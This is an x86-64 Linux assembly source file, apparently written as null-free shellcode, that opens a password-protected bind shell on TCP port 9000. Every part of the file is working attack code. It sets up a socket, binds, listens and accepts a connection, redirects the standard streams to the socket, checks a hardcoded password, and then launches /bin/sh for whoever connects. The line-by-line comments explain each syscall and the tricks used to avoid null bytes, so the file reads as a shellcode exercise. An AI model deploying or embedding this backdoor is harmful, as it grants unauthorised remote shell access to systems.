global _start

_start:

xor:

        xor rax, rax           ; Zeroes out RAX.
        xor rdi, rdi           ; Zeroes out RDI.
        xor rsi, rsi           ; Zeroes out RSI.
        xor rdx, rdx           ; Zeroes out RDX.

socket:

        push word 41           ; Pushes word 41 (socket) into the stack.
        pop ax                 ; Pops such word into ax so there are no nulls.

        inc rdi                ; Increments RDI.
        inc rdi                ; Increments RDI. Gives the value of AF_INET.
        inc rsi                ; Increments RSI. Gives value of SOCK_STREAM.

        push rdx               ; As the protocol isn't important, the value of 0 in RDX is pushed.
        syscall                ; The syscall is executed.

        mov rbx, rax           ; The value of RAX is saved on RBX. Such value will later on be used for sockfd arguments.

bind:

        push word 49           ; Pushes word 49 (bind) into the stack.
        pop ax                 ; Pops such word into ax so there are no nulls.

        mov rdi, rbx           ; Copies the value from RBX to RDI, granting RDI the sockfd value from the socket syscall.
        push rdx               ; As the following parameter is a const struct sockaddr, and this is a bind shell, the first values aren't actually required, therefore, zeroes are pushed through EDX.
        push rdx               ; The same as stated above.
        push word 0x2823       ; Pushes the word 9000 into the stack.
        push word 0x02         ; Pushes AF_INET into the stack.
        mov rsi, rsp           ; Copies the value of RSP into RSI.
        mov dl, 30             ; This argument requires the length of the struct, anything above 16 should work.
        syscall                ; The syscall is executed.

listen:

        push word 50           ; Pushes word 50 (listen) into the stack.
        pop ax                 ; Pops such word into ax so there are no nulls.

        mov rdi, rbx           ; Copies the value from RBX to RDI, granting RDI the sockfd value from the socket syscall.
        xor rsi, rsi           ; Zeroes out RSI.
        syscall                ; The syscall is executed.

accept:

        push word 43           ; Pushes word 43 (listen) into the stack.
        pop ax                 ; Pops such word into ax so there are no nulls.

        mov rdi, rbx           ; Copies the value from RBX to RDI, granting RDI the sockfd value from the socket syscall.
        xor rsi, rsi           ; Zeroes out RSI.
        xor rdx, rdx           ; Zeroes out RDI.
        syscall                ; The syscall is executed.

        mov rbp, rax           ; The value of RAX is saved on RBP. Such value will later on be used for sockfd arguments.

        inc rsi                ; Increments RSI.
        inc rsi                ; Increments RSI.
        inc rsi                ; Increments RSI. This will work as a counter, for the dup2 syscall, by incrementing RSI by three times NULLs are prvented.


dup2:

        push word 33           ; Pushes word 33 (dup2) into the stack.
        pop ax                 ; Pops such word into ax so there are no nulls.

        mov rdi, rbp           ; Copies the value from RBP to RDI, granting RDI the sockfd value from the socket syscall.
        dec rsi                ; RSI is decremented.
        syscall                ; The syscall is executed.

        jnz dup2               ; Jump to dup2 if the Zero flag (ZF) hasn't been set.

        jmp question           ; Jump to the "question" function.

halt:

        xor rax, rax           ; Zeroes out RAX.
        xor rdi, rdi           ; Zeroes out RDI.
        xor rsi, rsi           ; Zeroes out RSI.
        xor rdx, rdx           ; Zeroes out RDX.

        push rdi               ; Pushes the NULL DWORD (0x00000000) of RDI into the stack.
        pop rbp                ; Pops the NULL DWORD in RBP.
        push rbp               ; Pushes the NULL DWORD (0x00000000) of RBP into the stack. Without this combination of PUSH/POP instructions the printed characters would have an additional character that isn't needed (I.E an - or <)

        inc al                 ; Increments AL, giving the value 1 for the syscall write.
        inc rdi                ; Increments RDI, giving the value of 1, arranging STDOUT, printing the message on the screen.

        add si, ' '            ; Blank space.
        push rsi               ; Pushes the value of RSI into the stack.

        xor rsi, rsi           ; Zeroes out RSI.

        mov rsi, 'entials.'    ; Inserts value 'entials.' into RSI
        push rsi               ; Pushes the value of RSI into the stack.

        xor rsi, rsi           ; Zeroes out RSI.

        add rsi, 'cred'        ; Inserts value 'cred' into RSI
        push rsi               ; Pushes the value of RSI into the stack.

        xor rsi, rsi           ; Zeroes out RSI.

        add si, 't '           ; Inserts value 't ' into RSI
        push rsi               ; Pushes the value of RSI into the stack.

        mov rsi, 'Incorrec'    ; Inserts value 'Incorrec' into RSI
        push rsi               ; Pushes the value of RSI into the stack.

        mov rsi, rsp           ; Copies the value of RSP into RSI. The complete phrase should be "Incorrect credentials. "
        mov dl, 34             ; Gives DL the length of the entire string, which should be around 34. If DL is given a bigger value than the real one (I.E 50), the password will be printed when this message pops up.
        syscall                ; The syscall is executed.

question:

        xor rax, rax           ; Zeroes out RAX
        xor rdi, rdi           ; Zeroes out RDI
        xor rsi, rsi           ; Zeroes out RSI
        xor rdx, rdx           ; Zeroes out RDX

        push rdi               ; Pushes the NULL DWORD (0x00000000) of RDI into the stack.
        pop rbp                ; Pops the NULL DWORD in RBP.
        push rbp               ; Pushes the NULL DWORD (0x00000000) of RBP into the stack. Without this combination of PUSH/POP instructions the printed characters would have an additional character that isn't needed (I.E an - or <).

        inc al                 ; Increments AL, giving the value 1 for the syscall write.
        inc rdi                ; Increments RDI, giving the value of 1, arranging STDOUT, printing the message on the screen.

        mov rsi, 'assword:'    ; Inserts value 'assword:' into RSI.
        push rsi               ; Pushes the value of RSI into the stack.

        mov rsi, 'e your p'    ; Inserts value 'e your p' into RSI.
        push rsi               ; Pushes the value of RSI into the stack.

        mov rsi, 'Introduc'    ; Inserts value 'Introduc' into RSI.
        push rsi               ; Pushes the value of RSI into the stack.

        mov rsi, rsp           ; Copies the value of RSP into RSI. The complete phrase should be "Introduce your password:"

        mov dl, 28             ; Gives DL the length of the entire string, which should be around 28. If DL is given a bigger value than the real one (I.E 50), the string will be printed several times and lack certain characters.
        syscall                ; The syscall is executed.

read:

        xor rax, rax           ; Zeroes out RAX.
        xor rdx, rdx           ; Zeroes out RDX.

        push rdx               ; Pushes the NULL DWORD (0x00000000) of RDX into the stack.
        pop rbp                ; Pops the NULL DWORD in RBP.
        push rbp               ; Pushes the NULL DWORD (0x00000000) of RBP into the stack. Without this combination of PUSH/POP instructions the printed characters would have an additional character that isn't needed (I.E an - or <).

        mov rsi, rsp           ; Copies the value of RSP into RSI.

        mov dl, 30             ; Gives DL the quantity of bytes to read, anything beyond intended should work as well.
        syscall                ; The syscall is executed.

comparison:
                               ; Password: WjbkN3yQRpKVEFbA
        mov rdi, rsp           ; Copies the value of RSP into RSI. This will copy what was read on the previous function.

        xor rax, rax           ; Zeroes out RAX.
        xor rsi, rsi           ; Zeroes out RSI.
        xor rdx, rdx           ; Zeroes out RDX.

        mov rsi, 'RpKVEFbA'    ; Inserts value 'RpKVEFbA' into RSI.
        push rsi               ; Pushes the value of RSI into the stack.

        mov rsi, 'WjbkN3yQ'    ; Inserts value 'WjbkN3yQ' into RSI.
        push rsi               ; Pushes the value of RSI into the stack.

        mov rsi, rsp           ; Copies the value of RSP into RSI.

        xor rcx, rcx           ; Zeroes out RCX
        mov cl, 16             ; Gives CL a value of 16. This value should remain the same length as the password (WjbkN3yQRpKVEFbA), as this value will be crucial for comparison.
                               ; If given less, the complete password isn't needed. If given more, the credential will not work even if sent correctly.

        repe cmpsb             ; Will compare the strings and check if such match. If they do, it sets the Zero flag (ZF).
        jnz halt               ; Jump if the as long as the Zero flag (ZF) is not set, this means that if the password is incorrect, it should redirect the flow to the error message.

execve:

        xor rax, rax           ; Zeroes out RAX.
        push rax               ; Pushes the NULL DWORD of RAX.

        mov rbx, '//bin/sh'    ; Gives RBX the value '//bin/sh'
        push rbx               ; Pushes the value of RBX into the Stack.

        mov rdi, rsp           ; Copies the value of RSP into RDI.
        push rax               ; Pushes the NULL DWORD of RAX.

        mov rdx, rsp           ; Copies the value of RSP into RDX, giving a value of 0.
        push rdi               ; Pushes the value of RDI into the Stack.

        mov rsi, rsp           ; Copies the value of RSP into RSI.

        push word 59           ; Pushes word 59 (execve) into the stack.
        pop ax                 ; Pops such word into ax so there are no nulls.

        syscall                ; The syscall is executed.
